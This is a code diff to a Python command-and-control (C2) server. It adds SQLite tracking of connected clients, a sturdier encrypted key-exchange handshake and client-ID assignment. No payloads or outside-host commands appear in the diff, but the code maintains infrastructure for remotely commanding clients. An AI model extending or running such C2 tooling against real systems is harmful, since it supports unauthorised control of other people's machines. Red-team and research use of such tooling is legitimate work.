@@ -12,9 +12,11 @@ import base64
 import os
 import sys
 import argparse
+from pathlib import Path
 
 from helpers.formatStrings import bcolors
 from helpers.payloadGen import PayloadGenerator
+from helpers.db_operations import DBManager
 
 class C2Server:
     def __init__(self, host='0.0.0.0', port=5000, initial_payload=None):
@@ -31,6 +33,12 @@ class C2Server:
         self.task_lock = threading.Lock()  # New lock for task operations
         self.initial_payload = initial_payload  # Store the initial payload
         self.payload_generator = PayloadGenerator()  # Initialize PayloadGenerator
+
+        # Persistent client tracking
+        data_dir = Path(__file__).resolve().parent / "data"
+        data_dir.mkdir(parents=True, exist_ok=True)
+        self.db = DBManager(str(data_dir / "clients.db"))
+        self._ensure_client_table()
         
         # Ensure logs directory exists
         os.makedirs('../logs', exist_ok=True)
@@ -45,6 +53,44 @@ class C2Server:
         )
         self.logger = logging.getLogger('C2Server')
         self.logger.info("C2 Server initialized")
+
+    def _ensure_client_table(self):
+        """Ensure the clients table exists for persistent tracking."""
+        columns = {
+            "client_id": "TEXT PRIMARY KEY",
+            "address": "TEXT",
+            "last_activity": "REAL",
+            "connected_since": "REAL"
+        }
+        self.db.create_table("clients", columns)
+
+    def _persist_client(self, client_id, address, last_activity, connected_since=None):
+        """Upsert client metadata to the database."""
+        addr_str = f"{address[0]}:{address[1]}" if isinstance(address, (list, tuple)) and len(address) >= 2 else str(address)
+        connected_since = connected_since if connected_since is not None else last_activity
+        sql = (
+            "INSERT INTO clients (client_id, address, last_activity, connected_since) "
+            "VALUES (?, ?, ?, ?) "
+            "ON CONFLICT(client_id) DO UPDATE SET "
+            "address=excluded.address, last_activity=excluded.last_activity, connected_since=excluded.connected_since"
+        )
+        try:
+            self.db.execute_query(sql, (client_id, addr_str, last_activity, connected_since))
+        except Exception as exc:
+            self.logger.error(f"Failed to persist client {client_id}: {exc}")
+
+    @staticmethod
+    def _recv_exact(sock, num_bytes):
+        """Receive exactly num_bytes from a socket or raise."""
+        chunks = []
+        remaining = num_bytes
+        while remaining > 0:
+            chunk = sock.recv(remaining)
+            if not chunk:
+                raise ConnectionError("Socket closed while receiving data")
+            chunks.append(chunk)
+            remaining -= len(chunk)
+        return b"".join(chunks)
 
     def admin_interface(self):
         """Command line interface for sending commands"""
@@ -418,43 +464,59 @@ system_info
         self.logger.info(f"New connection from {address}")
         
         try:
+            client_socket.settimeout(10)
+            # Send READY_FOR_KEY_EXCHANGE
+            client_socket.sendall(b'READY_FOR_KEY_EXCHANGE')
+
             # Wait for CLIENT_READY
             client_ready = client_socket.recv(1024)
             if client_ready != b'CLIENT_READY':
-                raise ValueError("Client not ready for key exchange")
-            
-            # Send READY_FOR_KEY_EXCHANGE
-            client_socket.sendall(b'READY_FOR_KEY_EXCHANGE')
+                self.logger.warning(f"Ignoring connection {address}: unexpected preamble ({client_ready!r})")
+                client_socket.close()
+                return
             
             # Send server public key
             client_socket.sendall(self.get_public_key_pem())
             
             # Receive key lengths
-            symmetric_key_length = int(client_socket.recv(10).decode())
-            hmac_key_length = int(client_socket.recv(10).decode())
+            symmetric_key_length_raw = self._recv_exact(client_socket, 10)
+            hmac_key_length_raw = self._recv_exact(client_socket, 10)
+            symmetric_key_length = int(symmetric_key_length_raw.decode())
+            hmac_key_length = int(hmac_key_length_raw.decode())
             
             # Receive encrypted keys
-            encrypted_symmetric_key = client_socket.recv(symmetric_key_length)
-            encrypted_hmac_key = client_socket.recv(hmac_key_length)
-            
+            encrypted_symmetric_key = self._recv_exact(client_socket, symmetric_key_length)
+            encrypted_hmac_key = self._recv_exact(client_socket, hmac_key_length)
+
             # Decrypt keys
             symmetric_key = self.decrypt_asymmetric(encrypted_symmetric_key)
             hmac_key = self.decrypt_asymmetric(encrypted_hmac_key)
-            
+
+            # Register client id before finishing handshake
+            client_id = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
+
             # Send key exchange complete
             client_socket.sendall(b'KEY_EXCHANGE_COMPLETE')
-            
+
+            # Send client id (length prefixed) so the client knows its identifier
+            client_id_bytes = client_id.encode()
+            client_socket.sendall(len(client_id_bytes).to_bytes(4, "big"))
+            client_socket.sendall(client_id_bytes)
+
+            # Switch back to blocking with no timeout now that the handshake is complete
+            client_socket.settimeout(None)
+
             # Register client
-            client_id = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
-            
             with self.client_lock:
                 self.clients[client_id] = {
                     'socket': client_socket,
                     'address': address,
                     'symmetric_key': symmetric_key,
                     'hmac_key': hmac_key,
-                    'last_activity': time.time()
+                    'last_activity': time.time(),
+                    'connected_since': time.time()
                 }
+            self._persist_client(client_id, address, last_activity=time.time(), connected_since=self.clients[client_id]['connected_since'])
             
             self.logger.info(f"Client {client_id} registered successfully")
             
@@ -468,7 +530,7 @@ system_info
         except Exception as e:
             self.logger.error(f"Error handling client {address}: {str(e)}")
             client_socket.close()
-    
+
     def handle_client_communication(self, client_id):
         try:
             with self.client_lock:
@@ -478,6 +540,9 @@ system_info
                 client_socket = client_info['socket']
                 symmetric_key = client_info['symmetric_key']
                 hmac_key = client_info['hmac_key']
+                # Track when the client connected
+                if 'connected_since' not in client_info:
+                    client_info['connected_since'] = time.time()
             
             cipher = Fernet(symmetric_key)
             
@@ -508,9 +573,18 @@ system_info
                         h.verify(encrypted_hmac)
                     except Exception:
                         continue
+
+                    # Update last activity timestamp
+                    with self.client_lock:
+                        if client_id in self.clients:
+                            self.clients[client_id]['last_activity'] = time.time()
                     
                     decrypted_data = cipher.decrypt(encrypted_data).decode()
                     request = json.loads(decrypted_data)
+
+                    # Persist heartbeat/update
+                    self._persist_client(client_id, client_info.get('address'), last_activity=time.time(),
+                                         connected_since=client_info.get('connected_since'))
                     
                     # Handle specific request types
                     request_type = request.get('type')
@@ -526,16 +600,32 @@ system_info
                         }
                     
                     elif request_type == 'clients':
-                        response = {
-                            'clients': [
-                                {
+                        clients = []
+                        with self.client_lock:
+                            for cid, info in self.clients.items():
+                                clients.append({
                                     'id': cid,
-                                    'address': info['address'],
-                                    'last_activity': info['last_activity']
-                                }
-                                for cid, info in self.clients.items()
-                            ]
-                        }
+                                    'address': info.get('address'),
+                                    'last_activity': info.get('last_activity'),
+                                    'connected_since': info.get('connected_since')
+                                })
+
+                        # Merge in any persisted entries not in memory
+                        try:
+                            persisted = self.db.select("clients")
+                            seen_ids = {c['id'] for c in clients}
+                            for row in persisted:
+                                if row.get('client_id') not in seen_ids:
+                                    clients.append({
+                                        'id': row.get('client_id'),
+                                        'address': row.get('address'),
+                                        'last_activity': row.get('last_activity'),
+                                        'connected_since': row.get('connected_since')
+                                    })
+                        except Exception as exc:
+                            self.logger.error(f"Failed to read clients from DB: {exc}")
+
+                        response = {"clients": clients}
                     
                     elif request_type == 'client_info':
                         client_id = request_data.get('client_id')
